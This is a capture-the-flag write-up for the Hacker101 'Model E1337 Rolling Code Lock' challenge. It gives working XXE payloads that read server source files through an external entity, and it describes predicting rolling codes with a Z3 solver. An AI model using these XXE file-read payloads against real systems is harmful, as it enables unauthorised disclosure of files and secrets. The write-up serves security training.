# 🔒 Model E1337 - Rolling Code Lock

> **Platform:** Hacker101 CTF &nbsp;|&nbsp; **Difficulty:** `Hard` &nbsp;|&nbsp; **Flags:** `2/2` ✅

---

## ⛓️ Attack Chain

```
Directory recon → XXE on /set-config → Read main.py → Flag 0
→ Read rng.py → Get 2 expected codes → Z3 solver → Predict unlock code → Flag 1
```

---

## 🔍 Application Overview

A lock screen asking for an unlock code. Entering a wrong code leaks the expected value: `"Code incorrect. Expected: XXXXXXXX"`. This exposes PRNG output, enabling cryptanalysis. The app also has an `/admin` panel and a `/set-config` endpoint vulnerable to XXE.

---

## 🚩 Flag 0 — XXE to Read Source Code

**Step 1 — Discover endpoints:**
```
/admin        → Admin panel, leaks HTML comment about get-config
/get-config   → Returns XML with lock location
/set-config   → Accepts XML via ?data= parameter
```

**Step 2 — Confirm XXE:**
```
/set-config?data=<?xml version="1.0"?><config><location>test</location></config>
```
Redirects to `/admin` and updates the location — XML is being parsed.

**Step 3 — Read main.py:**
```
/set-config?data=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/main.py">]><config><location>&xxe;</location></config>
```

Check `/admin` — the source code of `main.py` appears as the location value. Flag 0 is hardcoded in a comment inside `main.py`.

---

## 🚩 Flag 1 — PRNG Cryptanalysis

**Step 1 — Read rng.py via XXE:**
```
/set-config?data=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/rng.py">]><config><location>&xxe;</location></config>
```

This reveals the custom PRNG algorithm used to generate rolling codes.

**Step 2 — Get two consecutive expected codes:**

Enter any wrong code twice (without restarting the instance):
```
Enter: 123456  →  "Code incorrect. Expected: XXXXXXXX"  ← code1
Enter: 999999  →  "Code incorrect. Expected: YYYYYYYY"  ← code2
```

**Step 3 — Run the Z3 solver** (see `solve_prng.py`):

Replace `code1` and `code2` in the script with your values, then:
```bash
python3 solve_prng.py
```

Output:
```
Seed found: XXXXXXXXX
Unlock code: XXXXXXXXX
```

**Step 4 — Submit the unlock code** at the lock screen → Flag 1 appears.

> ⚠️ **Do NOT restart the instance** between getting code1 and code2. The seed changes on restart, making both codes useless.

---

## 🧠 Why It Works

| Vulnerability | Root Cause |
|---|---|
| XXE | `/set-config` parses XML with external entities enabled — no sanitization |
| PRNG Leak | Wrong code submissions expose the actual expected value |
| PRNG Weakness | 32-bit seed space is small enough for Z3 to brute-force symbolically |

---

## 📋 Payloads

```xml
<!-- Read any file via XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/main.py">]>
<config><location>&xxe;</location></config>

<!-- Same for rng.py -->
<!ENTITY xxe SYSTEM "file:///app/rng.py">
```

```bash
# Run solver (edit code1 and code2 first)
python3 solve_prng.py
```
